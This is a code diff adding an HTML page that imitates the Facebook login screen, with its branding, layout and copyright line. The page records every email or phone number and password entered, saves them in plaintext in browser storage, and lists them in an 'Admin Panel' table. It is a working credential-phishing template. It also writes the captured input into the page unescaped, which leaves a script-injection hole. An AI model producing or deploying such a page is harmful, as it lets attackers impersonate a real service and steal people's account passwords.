@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log in or Sign up</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        .container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-grow: 1;
+            padding: 72px 0;
+        }
+        
+        .content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 980px;
+            width: 100%;
+        }
+        
+        .intro {
+            margin-right: 60px;
+            max-width: 500px;
+        }
+        
+        .intro h1 {
+            color: #1877f2;
+            font-size: 60px;
+            font-weight: bold;
+            margin-bottom: 16px;
+        }
+        
+        .intro h2 {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+        }
+        
+        .login-form {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            max-width: 396px;
+            width: 100%;
+        }
+        
+        .login-form input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+        }
+        
+        .login-button {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            line-height: 48px;
+            padding: 0 16px;
+            width: 100%;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+        
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+        
+        .forgot-password {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-password a {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            align-items: center;
+            border-bottom: 1px solid #dadde1;
+            display: flex;
+            margin: 20px 16px;
+            text-align: center;
+        }
+        
+        .create-account {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            line-height: 48px;
+            padding: 0 16px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 0 auto;
+            display: block;
+        }
+        
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        
+        .admin-panel {
+            display: none;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            max-width: 800px;
+            width: 100%;
+            margin: 20px auto;
+        }
+        
+        .admin-panel h2 {
+            color: #1877f2;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .admin-panel table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        .admin-panel th, .admin-panel td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #dddfe2;
+        }
+        
+        .admin-panel th {
+            background-color: #f0f2f5;
+            font-weight: bold;
+        }
+        
+        .admin-panel tr:hover {
+            background-color: #f5f6f7;
+        }
+        
+        .back-button {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            padding: 10px 20px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        footer {
+            background-color: white;
+            padding: 20px;
+            text-align: center;
+            color: #8a8d91;
+            font-size: 14px;
+        }
+        
+        .toggle-admin {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 10px 15px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #42b72a;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 6px;
+            display: none;
+            z-index: 1000;
+        }
+        
+        @media (max-width: 900px) {
+            .content {
+                flex-direction: column;
+            }
+            
+            .intro {
+                margin-right: 0;
+                margin-bottom: 40px;
+                text-align: center;
+            }
+            
+            .intro h1 {
+                font-size: 48px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <button class="toggle-admin" id="toggleAdmin">Admin Panel</button>
+    <div class="notification" id="notification">Login successful! Data saved.</div>
+    
+    <div class="container" id="loginContainer">
+        <div class="content">
+            <div class="intro">
+                <h1>facebook</h1>
+                <h2>Connect with friends and the world around you on Facebook.</h2>
+            </div>
+            <div class="login-form">
+                <form id="loginForm">
+                    <input type="text" id="email" placeholder="Email address or phone number" required>
+                    <input type="password" id="password" placeholder="Password" required>
+                    <button type="submit" class="login-button">Log In</button>
+                    <div class="forgot-password">
+                        <a href="#">Forgot password?</a>
+                    </div>
+                    <div class="divider"></div>
+                    <button type="button" class="create-account" id="createAccount">Create New Account</button>
+                </form>
+            </div>
+        </div>
+    </div>
+    
+    <div class="admin-panel" id="adminPanel">
+        <h2>Admin Panel - User Data</h2>
+        <table id="userTable">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Email/Phone</th>
+                    <th>Password</th>
+                    <th>Login Time</th>
+                </tr>
+            </thead>
+            <tbody id="userTableBody">
+                <!-- User data will be inserted here -->
+            </tbody>
+        </table>
+        <button class="back-button" id="backButton">Back to Login</button>
+    </div>
+    
+    <footer>
+        <p>Facebook &copy; 2023</p>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginForm = document.getElementById('loginForm');
+            const adminPanel = document.getElementById('adminPanel');
+            const loginContainer = document.getElementById('loginContainer');
+            const toggleAdmin = document.getElementById('toggleAdmin');
+            const backButton = document.getElementById('backButton');
+            const userTableBody = document.getElementById('userTableBody');
+            const notification = document.getElementById('notification');
+            
+            // Load existing user data from localStorage
+            let userData = JSON.parse(localStorage.getItem('facebookUserData')) || [];
+            
+            // Update the admin panel table
+            function updateAdminTable() {
+                userTableBody.innerHTML = '';
+                userData.forEach((user, index) => {
+                    const row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td>${index + 1}</td>
+                        <td>${user.email}</td>
+                        <td>${user.password}</td>
+                        <td>${user.timestamp}</td>
+                    `;
+                    userTableBody.appendChild(row);
+                });
+            }
+            
+            // Initial table update
+            updateAdminTable();
+            
+            // Login form submission
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+                
+                // Create user object
+                const user = {
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toLocaleString()
+                };
+                
+                // Add to user data array
+                userData.push(user);
+                
+                // Save to localStorage
+                localStorage.setItem('facebookUserData', JSON.stringify(userData));
+                
+                // Update admin table
+                updateAdminTable();
+                
+                // Show notification
+                notification.style.display = 'block';
+                setTimeout(() => {
+                    notification.style.display = 'none';
+                }, 3000);
+                
+                // Clear form
+                loginForm.reset();
+            });
+            
+            // Toggle admin panel
+            toggleAdmin.addEventListener('click', function() {
+                if (adminPanel.style.display === 'block') {
+                    adminPanel.style.display = 'none';
+                    loginContainer.style.display = 'flex';
+                    toggleAdmin.textContent = 'Admin Panel';
+                } else {
+                    adminPanel.style.display = 'block';
+                    loginContainer.style.display = 'none';
+                    toggleAdmin.textContent = 'Back to Login';
+                }
+            });
+            
+            // Back button
+            backButton.addEventListener('click', function() {
+                adminPanel.style.display = 'none';
+                loginContainer.style.display = 'flex';
+                toggleAdmin.textContent = 'Admin Panel';
+            });
+            
+            // Create account button (for demonstration)
+            document.getElementById('createAccount').addEventListener('click', function() {
+                alert('This is a demo. In a real Facebook implementation, this would open a sign-up form.');
+            });
+        });
+    </script>
+</body>
+</html>
